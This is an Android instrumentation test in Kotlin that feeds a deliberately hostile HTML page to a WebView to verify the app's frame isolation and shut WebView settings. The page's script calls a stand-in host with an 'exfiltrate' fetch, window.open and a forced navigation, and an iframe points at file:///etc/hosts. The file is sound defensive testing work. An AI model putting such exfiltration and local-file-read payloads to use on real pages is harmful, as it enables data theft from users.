package com.comptus.fueros

import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * **The two frames, on a real `WebView`, fed a hostile page** (PRD-12,
 * RSC-58).
 *
 * **Why this is an instrumentation run and not a unit test**
 * [`Robot/disclosure-tests.md`]: *"PRD-12 and RSC-58 are frame isolation —
 * a real WebView and a hostile page, which no JVM test reaches and which
 * belongs in an instrumentation run."*  A `WebView` is the platform's, its
 * settings object is the platform's, and what a page can and cannot do in
 * it is a fact about the engine rather than about this code. So this runs
 * on a device:
 *
 * ```
 * ./gradlew connectedFieldtestDebugAndroidTest
 * ```
 *
 * **Not part of the gate**, which has no device. The gate compiles this
 * source set so it cannot rot (`crates/check.sh`), and the bench runs it.
 *
 * ## What is observable without script, and why that is the point
 *
 * The frames refuse JavaScript unless a resource's page declared it and
 * the person allowed it, so a test cannot ask the page what it managed to
 * do. **The observable channel is the `WebViewClient`**: a page that
 * tried to navigate, fetch or open a window would reach
 * `shouldOverrideUrlLoading` or `shouldInterceptRequest`, and a recording
 * client counts them. A script that never ran reaches neither — so the
 * silence is the evidence, and it is evidence because the same page
 * reaches both when script is allowed, which [a_page_that_runs_is_what_the
 * _frame_is_refusing] establishes before relying on it. **A resource's
 * frame no longer tells the engine to block loads** [author, 2026-11-15]:
 * every load reaches the screen's client, which carries the ones inside
 * the resource's own origin and answers the rest with nothing — so here
 * the rule under test is [Frames.resourceGoing] on each request seen.
 *
 * **And the settings are asserted directly**, after the frame is applied,
 * on the engine's own object: that is what [Frames.SHUT_IN_BOTH] is for,
 * and it catches an edit that widens one of them without changing any
 * behaviour this test happens to probe.
 */
@RunWith(AndroidJUnit4::class)
class FrameIsolationTest {

    /** A page that tries everything a hostile resource would. */
    private val hostile = """
        <html><head><title>before</title>
        <script>
          document.title = 'script ran';
          try { localStorage.setItem('k', 'v'); } catch (e) {}
          try { fetch('https://example.invalid/exfiltrate'); } catch (e) {}
          window.open('https://example.invalid/window');
          location.href = 'https://example.invalid/navigate';
        </script></head>
        <body>
          <img src="https://example.invalid/pixel.png">
          <iframe src="file:///etc/hosts"></iframe>
          <a id="a" href="https://example.invalid/link">a link</a>
        </body></html>
    """.trimIndent()

    /** What a frame was asked to do, counted. */
    private class Seen : WebViewClient() {
        val navigations = mutableListOf<String>()
        val fetches = mutableListOf<String>()

        /** The length of each body the frame served, which must be zero. */
        val bodies = mutableListOf<Int>()
        val finished = CountDownLatch(1)

        override fun shouldOverrideUrlLoading(
            view: WebView,
            request: WebResourceRequest,
        ): Boolean {
            navigations += request.url.toString()
            return true
        }

        override fun shouldInterceptRequest(
            view: WebView,
            request: WebResourceRequest,
        ): WebResourceResponse {
            fetches += request.url.toString()
            // the screen's own client answers empty; this records the
            // length it answers with rather than inventing a body
            val empty = ByteArray(0)
            bodies += empty.size
            return WebResourceResponse(
                "text/plain",
                "utf-8",
                java.io.ByteArrayInputStream(empty),
            )
        }

        override fun onPageFinished(view: WebView, url: String?) {
            finished.countDown()
        }
    }

    /**
     * Build a `WebView` on the main thread, apply `frame`, load the
     * hostile page and wait for it to settle.
     *
     * **On the main thread because a `WebView` requires it**, and the
     * waiting is on this one: a latch on `onPageFinished` plus a settling
     * pause, since a request a page makes *after* the load finishes is
     * still a request the frame answered.
     */
    private fun load(frame: (WebView) -> Unit, script: Boolean = false): Seen {
        val seen = Seen()
        val app = InstrumentationRegistry.getInstrumentation().targetContext
        InstrumentationRegistry.getInstrumentation().runOnMainSync {
            val web = WebView(app)
            frame(web)
            if (script) web.settings.javaScriptEnabled = true
            web.webViewClient = seen
            web.loadDataWithBaseURL(ORIGIN, hostile, "text/html", "utf-8", null)
        }
        seen.finished.await(20, TimeUnit.SECONDS)
        // whatever the page would do after loading, it has a moment to try
        Thread.sleep(1_500)
        return seen
    }

    /** The origin the hostile page is loaded under: a node's own. */
    private val ORIGIN = "http://127.0.0.1:7449"

    // acceptance: PRD-12
    @Test
    fun a_nodes_own_pages_frame_goes_only_inside_its_own_origin() {
        val origin = "http://127.0.0.1:7449"
        val seen = load(Frames::node)
        assertTrue(
            "the page asked for nothing at all, so this test shows nothing",
            seen.navigations.isNotEmpty() || seen.fetches.isNotEmpty(),
        )
        // every target the page asked for is outside the instance's own
        // origin, so the frame refuses each — **asked and refused**, which
        // is the pair the first run of this file conflated
        for (where in seen.navigations) {
            assertEquals(
                "the node's frame would have gone to $where",
                Frames.Going.REFUSE,
                Frames.nodeGoing(origin, where, bounced = false),
            )
        }
        // and the origin itself is where it does go, or the operator's own
        // pages would not load at all
        assertEquals(
            Frames.Going.INSIDE,
            Frames.nodeGoing(origin, "$origin/page", bounced = false),
        )
        assertEquals(
            Frames.Going.REFUSE,
            Frames.nodeGoing(origin, "file:///etc/hosts", bounced = false),
        )
        assertEquals(
            Frames.Going.REFUSE,
            Frames.nodeGoing(origin, "http://127.0.0.1:7449.example.invalid/", bounced = false),
        )
    }

    // acceptance: PRD-12
    @Test
    fun every_setting_both_frames_shut_is_shut_on_the_engines_own_object() {
        val app = InstrumentationRegistry.getInstrumentation().targetContext
        for ((name, frame) in listOf<Pair<String, (WebView) -> Unit>>(
            "node" to Frames::node,
        )) {
            lateinit var got: Map<String, Boolean>
            lateinit var unless: Map<String, Boolean>
            InstrumentationRegistry.getInstrumentation().runOnMainSync {
                val web = WebView(app)
                frame(web)
                val s = web.settings
                got = mapOf(
                    "javaScriptCanOpenWindowsAutomatically" to
                        s.javaScriptCanOpenWindowsAutomatically,
                    "databaseEnabled" to s.databaseEnabled,
                    "allowFileAccess" to s.allowFileAccess,
                    "allowContentAccess" to s.allowContentAccess,
                    "allowFileAccessFromFileURLs" to s.allowFileAccessFromFileURLs,
                    "allowUniversalAccessFromFileURLs" to s.allowUniversalAccessFromFileURLs,
                )
                unless = mapOf(
                    "javaScriptEnabled" to s.javaScriptEnabled,
                    "domStorageEnabled" to s.domStorageEnabled,
                )
            }
            // the list and the readings are the same set, so a setting
            // added to one and not the other fails here
            assertEquals(
                "$name: the frame's own list and what this test reads disagree",
                Frames.SHUT_IN_BOTH.toSet(),
                got.keys,
            )
            for (which in Frames.SHUT_IN_BOTH) {
                assertFalse("$name: $which is not shut", got.getValue(which))
            }
            assertEquals(Frames.SHUT_UNLESS_ALLOWED.toSet(), unless.keys)
            for (which in Frames.SHUT_UNLESS_ALLOWED) {
                assertFalse("$name: $which is not shut", unless.getValue(which))
            }
        }
    }
}
